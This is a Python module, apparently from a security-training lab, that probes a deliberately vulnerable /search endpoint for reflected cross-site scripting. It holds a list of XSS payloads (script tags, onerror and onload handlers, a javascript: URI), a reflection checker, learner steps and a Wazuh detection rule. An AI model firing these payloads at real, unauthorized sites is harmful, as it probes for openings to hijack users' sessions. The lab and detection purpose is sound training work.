"""
modules/xss.py — APP-01: Reflected Cross-Site Scripting probe.

Target: GET /search?q=<payload>
Vulnerability: q is rendered unsanitized into HTML response.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_DEFAULT_PAYLOADS = [
    "<script>alert('XSS-LAB-01')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(document.domain)>",
    "javascript:alert(1)",
    '\"><script>alert(\"escaped\")</script>',
]


class XSSModule(BaseModule):
    module_id = "xss"
    name = "Reflected XSS"
    description = (
        "Injects XSS payloads into the /search endpoint and checks "
        "whether the payload is reflected verbatim in the response body."
    )
    category = Category.WEB
    scenario_id = "APP-01"
    severity = Severity.HIGH
    lab = {
        "target_path": "/search",
        "vulnerable_component": "Flask search handler (search_bp.search)",
        "story": (
            "The marketing team shipped a search box that prints the user's "
            "query directly into the page. Your job is to confirm that the "
            "parameter is reflected without escaping and that arbitrary HTML "
            "executes."
        ),
        "learner_steps": [
            {"action": "Open the search page in the Lab Browser and search for 'hello'.",
             "expected": "The word 'hello' is echoed inside the results area."},
            {"action": "Try submitting <b>ATT</b> as a search query.",
             "expected": "The page renders bold text — HTML is NOT escaped."},
            {"action": "Try a script payload: <script>alert(1)</script>",
             "expected": "An alert box fires — reflected XSS is confirmed."},
            {"action": "Experiment with other payloads: <img src=x onerror=alert('xss')>",
             "expected": "Each payload executes — no input sanitization exists."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "expected": "Alert triggered on suspicious script tags in the search query."},
        ],
        "detection_rule": "Wazuh web attack signature (XSS / script tag in URL)",
        "success_markers": [
            "✓ REFLECTED in the activity log",
            "Raw <script> / onerror visible in the response body",
            "Wazuh alert on the /search request",
        ],
        "quick_probe": "/search?q=<script>alert(1)</script>",
    }
    steps = [
        {
            'title': 'Probe /search with benign query',
            'hint': 'Confirm the parameter is reflected into the HTML',
            'expected': 'Query string echoed verbatim in the page',
            'markers': ['Running ', 'XSS payloads'],
        },
        {
            'title': 'Inject payload variants',
            'hint': '<script>, onerror, svg onload, javascript: URIs',
            'expected': 'Server returns 200 with the payload un-escaped',
            'markers': ['not reflected', 'REFLECTED'],
        },
        {
            'title': 'Verify reflection is exploitable',
            'hint': 'Exact payload string present unescaped in response body',
            'expected': 'XSS confirmed on the matching payload',
            'markers': ['✓ REFLECTED', 'payloads reflected', 'Complete —'],
        },
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="custom_payload",
                display_name="Custom Payload",
                description="Optional custom XSS payload to add to the default list",
                default="",
            ),
            ModuleOption(
                name="endpoint",
                display_name="Search Endpoint",
                description="Path of the vulnerable search endpoint",
                default="/search",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        endpoint = opts.get("endpoint", "/search")

        payloads = list(_DEFAULT_PAYLOADS)
        custom = opts.get("custom_payload", "").strip()
        if custom:
            payloads.append(custom)

        self._log(log_fn, f"Running {len(payloads)} XSS payloads against {endpoint}")
        reflected_count = 0

        for i, payload in enumerate(payloads, 1):
            url = target.base_url + endpoint
            r = self._get(url, params={"q": payload},
                          label=f"payload-{i}", timeout=target.timeout)

            reflected = payload[:20] in (r.detail or "")
            if reflected:
                reflected_count += 1
                r.evidence = f"REFLECTED: {payload[:40]}"

            symbol = "✓ REFLECTED" if reflected else "– not reflected"
            self._log(log_fn, f"  [{i}/{len(payloads)}] {symbol}  |  {payload[:50]}")
            steps.append(r)

        summary = f"{reflected_count}/{len(payloads)} payloads reflected in response."
        return self._make_result(target, steps, summary, started)
